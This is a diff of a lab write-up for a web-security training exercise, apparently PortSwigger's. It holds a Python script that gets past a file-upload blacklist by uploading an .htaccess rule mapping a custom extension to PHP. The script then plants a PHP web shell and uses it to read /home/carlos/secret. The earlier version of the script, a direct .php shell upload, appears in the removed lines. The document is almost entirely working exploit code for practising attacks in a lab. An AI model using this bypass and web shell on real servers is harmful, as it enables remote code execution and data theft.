@@ -1,8 +1,13 @@
-Target Goal - Exploit the file upload vulnerability to exfiltrate the contents of the file /home/carlos/secret
+
+Target Goal - Bypass blacklist defense and upload a PHP web shell to exfitrate the contents of the file /home/carlos/secret
 
 Creds - wiener:peter
 
 Analysis:
+
+Google search for .thaccess file
+Add AddType application/x-httpd-php .test to .htaccess
+Upload file with .test extension and payload
 
 ```python
 import requests
@@ -28,8 +33,8 @@ def exploit_file_upload(s, url):
     # Get CSRF token
     login_url = url + "/login"
     csrf_token = get_csrf_token(s, login_url)
-
-    # Loggin in as the wiener user
+    
+    # Login as wiener
     print("(+) Logging in as the wiener user...")
     data_login = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
     r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
@@ -37,15 +42,15 @@ def exploit_file_upload(s, url):
     if 'Log out' in r.text:
         print("(+) Successfully logged in as the wiener user...")
 
-        # Uploading URL
-        print("(+) Uploading web shell...")
-        account_url = url + "/my-account"
-        csrf_token = get_csrf_token(s, account_url)
-        avatar_url = url + "/my-account/avatar"
-        params = {"avatar": ('test.php', "<?php system($_GET['cmd']);?>", 'application/x-php'), 
-        "user": "wiener",
-        "csrf": csrf_token}
-
+        # Uploading .htaccess file
+        print("(+) Uploading .htaccess file...")
+        my_account_url = url + '/my-account'
+        csrf_token = get_csrf_token(s, my_account_url)
+        avatar_url = url + '/my-account/avatar'
+        params = {'avatar': ('.htaccess', 'AddType application/x-httpd-php .test', 'application/octet-stream'),
+        'user': 'wiener',
+        'csrf': csrf_token}
+         
         boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
 
         m = MultipartEncoder(fields=params, boundary=boundary)
@@ -54,27 +59,37 @@ def exploit_file_upload(s, url):
 
         r = s.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)
 
+        # Uploading web shell
+        print("(+) Uploading web shell...")
+        params2 = {'avatar': ('test.test', "<?php system($_GET['cmd']); ?>", 'application/octet-stream'),
+        'user': 'wiener',
+        'csrf': csrf_token}
+        m = MultipartEncoder(fields=params2, boundary=boundary)
+
+        headers = {'Content-Type': m.content_type}
+
+        r = s.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)
+
+        # Outputting the secre file
         print("(+) The following is the content of the secret file: ")
-        cmd_url = url + '/files/avatars/test.php?cmd=' + 'cat /home/carlos/secret'
+        cmd_url = url + '/files/avatars/test.test?cmd=cat /home/carlos/secret'
         r = s.get(cmd_url, verify=False, proxies=proxies)
         print(r.text)
 
     else:
-        print("(-) Could not login as the user.")
+        print("(-) Could not login as wiener user.")
         sys.exit(-1)
-
 
 
 def main():
-    if len(sys.argv) != 2:
+    if len(sys.argv) !=2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
-    
+
     s = requests.Session()
     url = sys.argv[1]
     exploit_file_upload(s, url)
-
 
 if __name__ == "__main__":
     main()
@@ -82,6 +97,6 @@ if __name__ == "__main__":
 
 RUN:
 ```bash
-python3 upload-file-lab-01.py 'https://ac0b1f8d1ff73e428074793800860063.web-security-academy.net'
+python3 upload-file-lab-04.py 'https://ac0b1f8d1ff73e428074793800860063.web-security-academy.net'
 ```
 END!
